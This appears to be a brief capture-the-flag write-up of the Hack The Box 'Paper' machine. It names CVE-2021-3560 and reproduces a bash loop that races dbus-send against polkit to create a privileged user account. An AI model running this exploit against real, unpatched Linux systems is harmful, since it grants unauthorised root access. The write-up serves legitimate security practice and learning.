Paper - Hack The Box

Paper is an easy-rated Linux machine from Hack The Box, themed around the TV Show ‘The Office’. In true ´The Office’ fashion we are met with Michaels incompetence and Dwights crazy ideas, compromizing the company security and giving us a foothold to Dwights Recyclops-server. I found the box to be very simple and straight forward, they path to user was very enjoyable and root had a fun little quirk. I warmly recommend this box! :)

Vulnerable to CVE-2021-3560

Google for cve-2021-3560 github and we find a lot of POCs, download one and try it out. The exploit will work as intended, a user is created, however we are not able to login as that user. Instead, try to exploit it manually.

The time is around 6-7 milliseconds, meaning we need to kill the dbus-send command after approximately 3 milliseconds.

[dwight@paper shm]$ for i in {1..50} ; do dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 & sleep 0.003s ; kill $! ; done
